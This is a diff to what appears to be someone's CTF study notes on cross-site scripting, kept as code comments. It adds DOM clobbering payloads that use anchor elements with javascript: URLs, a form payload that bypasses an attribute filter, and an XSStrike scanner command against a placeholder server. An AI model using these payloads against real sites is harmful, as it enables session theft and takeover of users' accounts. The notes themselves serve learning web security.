@@ -105,5 +105,17 @@
 // use &apos;-alert(document.domain)-&apos;
 //* if the controllable data is inside a template literal
 // ${alert(document.domain)}
-//! Client-side template injection
+//! Dom Clobbering
+//* to enable xss
+// if : iframe.src = window.someObject.src ;
+// we can change the someObject to an object that we set its src property
+// <a id=someObject><a id=someObject name=src src=javascript:alert(1)>
+//* to bypass filters
+// if the filter deletes attributes element.attributes.length > 0
+// in here element.attributes.length is gonna be undefined bypassing the filter
+// <form id=x tabindex=0 onfocus=print()><input id=attributes>
+//! tool
+//* XSStrike
+// at ctf/XSStrike
+// python3 xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"
 
